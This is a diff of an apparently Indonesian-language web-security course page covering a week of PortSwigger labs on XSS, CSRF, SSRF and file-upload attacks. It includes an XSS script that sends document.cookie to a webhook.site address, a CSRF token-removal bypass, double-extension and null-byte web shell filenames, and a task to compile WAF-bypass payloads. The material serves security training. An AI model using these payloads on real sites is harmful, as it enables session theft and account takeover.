@@ -19,14 +19,14 @@
 
 ## 📝 Rekap Minggu Ini
 
-Kompetensi teknis Anda dalam mendalami eksploitasi serangan di sisi klien (*Client-Side Attacks*) beserta teknik merantai kerentanan (*Chaining Vulns*) telah diasah sepanjang minggu ini:
+Pengetahuan teknis Anda dalam mendalami eksploitasi serangan sisi klien (*Client-Side Attacks*) dan teknik merantai kerentanan (*Chaining Vulns*) telah dilatih sepanjang minggu ini:
 
 | Hari | Topik | Key Takeaway |
 |------|-------|-------------|
-| Day 1 | XSS & Payload Crafting | Meracik *payload* skrip eksploitasi untuk mencuri *Cookie* dan mem-bypass filter WAF. |
-| Day 2 | CSRF & SSRF | Memaksa browser korban mengeksekusi aksi berbahaya tanpa disadari (*CSRF*), serta menipu peladen untuk menyerang jaringan internalnya sendiri (*SSRF*). |
-| Day 3 | File Upload & IDOR | Menginjeksi *Web Shell* PHP melalui celah fitur unggah file, serta memanipulasi parameter akses (*IDOR*). |
-| Day 4 | Chaining Vulnerabilities | Menggabungkan celah kecil terisolasi (*Self-XSS + SSRF* atau *CSRF*) menjadi serangan fatal berskala *Account Takeover*. |
+| Day 1 | XSS & Payload Crafting | Membuat skrip khusus (*payload*) untuk mencuri *Cookie* dan melewati filter WAF. |
+| Day 2 | CSRF & SSRF | Memaksa browser korban melakukan aksi tanpa disadari (*CSRF*), serta menipu *server* untuk mengakses jaringan internalnya sendiri (*SSRF*). |
+| Day 3 | File Upload & IDOR | Mengunggah *Web Shell* PHP melalui celah *File Upload* dan memanipulasi parameter akses (*IDOR*). |
+| Day 4 | Chaining Vulnerabilities | Menggabungkan celah keamanan berskala kecil (seperti *Self-XSS*, *CSRF*, *SSRF*) menjadi serangan berbahaya seperti *Account Takeover*. |
 
 ---
 
@@ -35,17 +35,17 @@ Kompetensi teknis Anda dalam mendalami eksploitasi serangan di sisi klien (*Clie
 ### Prerequisites
 - Koneksi internet yang stabil.
 - Akun portal laboratorium simulasi di **[PortSwigger Web Security Academy](https://portswigger.net/web-security)**.
-- Aplikasi *Burp Suite Community* yang siap digunakan untuk menyadap (*Intercept*) lalu lintas jaringan.
+- Aplikasi *Burp Suite Community* untuk mencegat (*Intercept*) lalu lintas jaringan.
 
-### Misi Hari Ini: "Membantai Tembok Klien (XSS/CSRF Gauntlet)"
+### Misi Hari Ini: "Eksploitasi Web Sisi Klien (XSS/CSRF)"
 
-Pada lab ini, Anda ditugaskan meluncurkan serangan eksploitasi di lingkungan sisi klien (*Client-Side*). Anda diwajibkan menjerat peramban pengguna agar korban memicu eksekusi *payload* berbahaya secara otomatis.
+Pada lab ini, Anda ditugaskan meluncurkan eksploitasi di lingkungan *Client-Side*. Anda harus menjebak browser target agar mengeksekusi *payload* berbahaya yang Anda sediakan.
 
 ### Step 1: Merampas Sesi Otentikasi (XSS Cookie Stealing)
 1. Buka lab PortSwigger bertajuk: **"Exploiting cross-site scripting to steal cookies"**.
 2. Anda akan menemukan fitur komentar pada halaman *Blog*.
-3. Buka *Burp Collaborator* (atau gunakan layanan penadah *payload* eksternal gratis seperti *Webhook.site*). Salin URL dari layanan penadah tersebut.
-4. Tancapkan injeksi payload XSS pada kolom komentar:
+3. Buka *Burp Collaborator* (atau layanan eksternal penangkap HTTP request seperti *Webhook.site*). Salin URL dari layanan tersebut.
+4. Sisipkan *payload XSS* pada kolom komentar:
    ```html
    <script>
    fetch('https://webhook.site/alamat_webhook_milikmu', {
@@ -55,85 +55,85 @@ Pada lab ini, Anda ditugaskan meluncurkan serangan eksploitasi di lingkungan sis
    });
    </script>
    ```
-5. Amati *Webhook* Anda. Saat simulasi bot Admin PortSwigger memuat halaman komentar tersebut, *Session Cookie* milik Admin akan tereksekusi dan terkirim otomatis ke layar Webhook-mu. Gunakan *Cookie* tersebut untuk menelikung masuk sebagai Admin!
+5. Pantau layanan *Webhook* Anda. Saat bot Admin (korban simulasi) PortSwigger memuat halaman komentar tersebut, *Session Cookie* milik Admin akan dikirimkan otomatis ke layar Webhook Anda. Gunakan *Cookie* tersebut untuk *login* sebagai Admin!
 
-### Step 2: Menjahit Eksekusi Paksaan (CSRF Token Bypass)
-1. Buka lab sasaran bertajuk: **"CSRF where token validation depends on token being present"**.
-2. Di lab ini, peladen memvalidasi keabsahan token *CSRF*, TAPI **hanya jika** token tersebut disertakan. Jika parameter token itu dibuang sepenuhnya, peladen justru meloloskan eksekusi tersebut!
-3. Gunakan *Burp Suite*. Tangkap (*Intercept*) permintaan formulir *Update Email*.
-4. Buatlah antarmuka *HTML* `CSRF Payload` di Burp Suite *Engagement Tools*. Hapus tag `<input type="hidden" name="csrf"...>` secara keseluruhan dari struktur *HTML*-mu tersebut.
-5. Uji skrip pemaksaan tersebut di browser. Email korban pun sukses terganti karena peladen gagal mendeteksi serangan saat token ditiadakan!
+### Step 2: Mengakali Validasi CSRF (Token Bypass)
+1. Buka lab bertajuk: **"CSRF where token validation depends on token being present"**.
+2. Di lab ini, sistem memvalidasi keabsahan token *CSRF*, TAPI **hanya jika** token tersebut dilampirkan dalam permintaan. Jika parameter token tersebut dihapus sepenuhnya, server justru menganggapnya sah!
+3. Gunakan *Burp Suite*. Cegat (*Intercept*) permintaan formulir *"Update Email"*.
+4. Buatlah halaman eksploitasi *HTML* (menggunakan fitur *CSRF PoC Generator* di Burp Suite). Hapus elemen `<input type="hidden" name="csrf"...>` secara keseluruhan dari *HTML* tersebut.
+5. Uji skrip *HTML* itu di browser. Email pengguna akan berhasil diubah karena server gagal mendeteksi serangan CSRF saat *token* sama sekali tidak dikirimkan.
 
 ---
 
 ## 🎯 Weekly Mission
 
-### Misi: "Pencetakan Manuskrip Payload (Exploitation Cheatsheet)"
+### Misi: "Dokumentasi Payload (Exploitation Cheatsheet)"
 
-**Deskripsi:** Hacker profesional tidak pernah menghafal dan mengetik ulang *Payload* eksploitasi rumit dari awal. Mereka menyimpannya di dalam lembar ringkasan (*Cheat Sheet*) agar siap disalin-tempel saat *Bug Hunting*.
+**Deskripsi:** *Bug Hunter* profesional jarang mengetik ulang *Payload* rumit dari awal. Mereka menyimpannya di dalam lembar referensi (*Cheat Sheet*) agar mudah digunakan kapan saja.
 
-**Tugas Mandiri:** Selesaikan **5 Lab** silang (pilih antara *XSS, CSRF, atau File Upload*) dari *PortSwigger*. Selama menyelesaikan lab, kumpulkan dan catat 10 variasi *Payload XSS/CSRF* andalan yang terbukti sukses menjebol sistem ke dalam satu manuskrip.
+**Tugas Mandiri:** Selesaikan **5 Lab PortSwigger** dengan topik *XSS, CSRF, atau File Upload*. Selama menyelesaikan lab, kumpulkan 10 *Payload* andalan yang terbukti berhasil dan catat dalam dokumen Anda.
 
 **Deliverables:**
-1. Satu dokumen *Markdown* bernama `PAYLOAD_CHEATSHEET.md`.
-2. Isi dokumen mencakup dua hal:
- - **XSS Payloads:** (Tulis 5 variasi bypass payload XSS. Contoh: `<img src=x onerror=...>`, `<svg onload=...>`, dll).
- - **Lab Writeups:** (Catat 5 judul mesin Lab PortSwigger yang sukses divalidasi dengan status 'Solved', serta rangkuman singkat taktik penaklukannya).
+1. Buat satu dokumen *Markdown* bernama `PAYLOAD_CHEATSHEET.md`.
+2. Isi dokumen mencakup:
+  - **XSS Payloads:** (Tulis 5 variasi XSS *payload*, khususnya yang bisa mem-*bypass* WAF. Contoh: `<img src=x onerror=...>`, `<svg onload=...>`, dll).
+  - **Lab Writeups:** (Catat 5 judul lab PortSwigger yang sukses diselesaikan beserta rangkuman singkat taktik penyelesaiannya).
 
 **Kriteria Sukses:**
-- [ ] 5 mesin Lab PortSwigger berhasil diselesaikan (status *Solved*).
-- [ ] Tersedia dokumentasi 10 baris Payload (jangan sekadar menggunakan `<script>alert(1)</script>`).
-- [ ] Tersedia ringkasan temuan di mana letak kerentanan pada lab-lab tersebut.
+- [ ] 5 mesin lab PortSwigger diselesaikan (berstatus *Solved*).
+- [ ] Tersedia dokumentasi 10 variasi Payload (jangan hanya menggunakan `<script>alert(1)</script>`).
+- [ ] Tersedia ringkasan temuan di lab-lab tersebut.
 
 ---
 
 ## 💡 Knowledge Check
 
 <details>
-<summary>❓ [MUDAH] Dalam injeksi XSS untuk mencuri kalung sesi Admin, objek JavaScript apakah yang diincar dan dikirimkan oleh peretas ke server penadahnya?</summary>
+<summary>❓ [MUDAH] Dalam pencurian sesi menggunakan injeksi XSS, elemen JavaScript apa yang diakses dan dikirimkan oleh skrip ke server penyerang?</summary>
 
-**Jawaban:** Atribut *document.cookie*.
+**Jawaban:** Atribut `document.cookie`.
 </details>
 
 <details>
-<summary>❓ [MUDAH] Metode peretasan Cross-Site Request Forgery (CSRF) menitikberatkan manipulasi yang memaksa pengguna target untuk...?</summary>
+<summary>❓ [MUDAH] Apa tujuan utama dari serangan Cross-Site Request Forgery (CSRF)?</summary>
 
-**Jawaban:** Mengeksekusi permintaan (Request) tertentu (seperti mentransfer aset atau mengganti email) ke server target **tanpa sepengetahuan atau kehendak sadar korban**, selama sesi otentikasi korban di browser tersebut masih aktif.
+**Jawaban:** Memaksa browser korban (yang sedang login) untuk mengeksekusi permintaan berbahaya (seperti transfer uang atau ganti email) **tanpa sepengetahuan korban**.
 </details>
 
 <details>
-<summary>❓ [SEDANG] Ketika server melarang keras ekstensi tulen `shell.php` dalam unggahan file, teknik manipulasi nama file apa yang bisa dilakukan pentester untuk menebeng eksploitasi?</summary>
+<summary>❓ [SEDANG] Ketika server memblokir ekstensi `shell.php` pada fitur unggah file, teknik manipulasi nama file apa yang bisa dicoba?</summary>
 
-**Jawaban:** Menggunakan siasat ekstensi ganda (*Double Extension*) `shell.php.jpg` atau injeksi Null Byte `shell.php%00.jpg`.
+**Jawaban:** Menggunakan ekstensi ganda (*Double Extension*) seperti `shell.php.jpg` atau injeksi *Null Byte* seperti `shell.php%00.jpg`.
 </details>
 
 <details>
-<summary>❓ [SEDANG] Serangan SSRF didesain untuk menyusup dan memaksa peladen target untuk menyerang jaringan internalnya sendiri. Alamat IP lokal mana yang paling lazim dieksploitasi untuk menginterogasi dasbor internal?</summary>
+<summary>❓ [SEDANG] Alamat IP lokal mana yang paling sering dieksploitasi dalam serangan SSRF untuk mengakses dasbor internal server?</summary>
 
-**Jawaban:** IP Localhost `127.0.0.1` (atau `localhost`).
+**Jawaban:** IP Localhost `127.0.0.1` (atau nama host `localhost`).
 </details>
 
 <details>
-<summary>❓ [SULIT] Jelaskan alur eksploitasi merantai (Chaining) antara celah manipulasi CSRF (mengganti email korban) menuju pengambilalihan akun secara total (Account Takeover)!</summary>
+<summary>❓ [SULIT] Jelaskan skenario perantaian kerentanan (Chaining) antara celah CSRF (mengganti email) untuk mencapai pengambilalihan akun (Account Takeover)!</summary>
 
-**Jawaban:** Peretas merangkai jebakan *CSRF* dan menipu korban untuk mengekliknya; akibatnya, alamat Email korban di sistem web target terganti menjadi alamat email milik *Hacker* secara diam-diam. Dengan berbekal email baru tersebut, peretas tinggal pergi ke halaman *Login*, mengeklik fitur *"Forgot Password / Lupa Sandi"*, dan tautan pemulihan sandi akan masuk langsung ke kotak masuk (*Inbox*) peretas. Akun berhasil diambil alih secara penuh!
+**Jawaban:** Penyerang menipu korban untuk mengeklik halaman HTML berisi eksekusi formulir *CSRF*. Alamat email korban terganti secara otomatis menjadi alamat email milik penyerang. Kemudian, penyerang menggunakan fitur "Lupa Password", dan tautan pemulihan sandi dikirimkan ke kotak masuk penyerang. Akun berhasil diambil alih secara penuh.
 </details>
 
 ---
 
 ## 📋 Weekly Checklist
 
-- [ ] Saya memahami alur eksekusi *Payload* pencurian sesi (Cookie Stealing).
-- [ ] Saya paham bahaya penipuan otorisasi CSRF dan penetrasi lokal SSRF.
-- [ ] Saya menguasai kelicikan teknik *Double Extension* & *Null Byte* pada unggah *Web Shell*.
-- [ ] Saya fasih menjabarkan alur merantai kerentanan (*Chaining Vulnerabilities*).
-- [ ] Saya telah menuntaskan dan menyetor naskah `PAYLOAD_CHEATSHEET.md` (Weekly Mission).
+- [ ] Saya memahami alur eksekusi *Payload* pencurian sesi (*Cookie Stealing*).
+- [ ] Saya mengerti serangan pemalsuan otorisasi (*CSRF*) dan manipulasi sisi *backend* (*SSRF*).
+- [ ] Saya mengetahui taktik *Double Extension* & *Null Byte* pada celah *File Upload*.
+- [ ] Saya bisa menjelaskan konsep merantai kerentanan (*Chaining Vulnerabilities*).
+- [ ] Saya telah menuntaskan tugas membuat `PAYLOAD_CHEATSHEET.md` (Weekly Mission).
 
 ---
 
 ## 💬 Diskusi Minggu Ini
 
-1. Setelah satu minggu ini membedah berbagai eksploitasi di sisi antarmuka klien (XSS, CSRF), menurutmu mana yang lebih menakutkan secara skenario nyata: server databasemu dibongkar melalui *SQL Injection*, atau kamu diretas secara diam-diam hanya karena mengeklik link jebakan *CSRF* dari sebuah gambar? Mengapa taktik penipuan klien ini terkadang berimbas sama fatalnya dengan jebolnya server?
+1. Setelah seminggu membedah berbagai kerentanan di sisi antarmuka klien (XSS, CSRF), menurut Anda mana yang dampaknya lebih berbahaya di dunia nyata: kebocoran *database* dari *SQL Injection*, atau akun admin dicuri secara diam-diam melalui *CSRF/XSS*? Mengapa celah di sisi klien (pengguna) kerap berakibat sama fatalnya dengan celah di sisi *server*?
 
 ---
 
@@ -150,7 +150,7 @@ Pada lab ini, Anda ditugaskan meluncurkan serangan eksploitasi di lingkungan sis
 └─────────────────────────────────────┘
 ```
 
-Selamat! Operasional pengujian eksploitasi di sisi klien (*Client-Side Attacks*) telah berhasil Anda lumat secara paripurna di minggu operasional ini!
+Selamat! Anda telah berhasil menuntaskan pelatihan eksploitasi web dari sisi klien (*Client-Side Attacks*) pada minggu ini!
 
 ---
 
@@ -158,9 +158,7 @@ Selamat! Operasional pengujian eksploitasi di sisi klien (*Client-Side Attacks*)
 
 **Minggu 18: Burp Suite & Advanced Tooling**
 
-Masa-masa menebak parameter secara manual tanpa alat bantu telah usai! Minggu depan, kita akan mulai mengoperasikan *senjata utama* para *Bug Hunter* profesional: **Burp Suite**. Kita akan belajar cara menyadap *Request* secara perlahan (*Intercept*), melepaskan serangan brutal berskala masif menggunakan *Intruder*, dan merajut serangan otomatis yang mampu menenggelamkan tameng perlindungan Web tanpa ampun!
-
-> 🚀 *"The manual labor ends. The orchestration of chaos begins."*
+Masa-masa eksploitasi secara manual perlahan berakhir! Minggu depan, kita akan mulai menggunakan *senjata utama* para *Bug Hunter* profesional: **Burp Suite**. Kita akan belajar mencegat permintaan (*Intercept*), meluncurkan pengujian skala besar (*Intruder*), dan menggunakan serangan otomatis secara efisien.
 
 ---
 
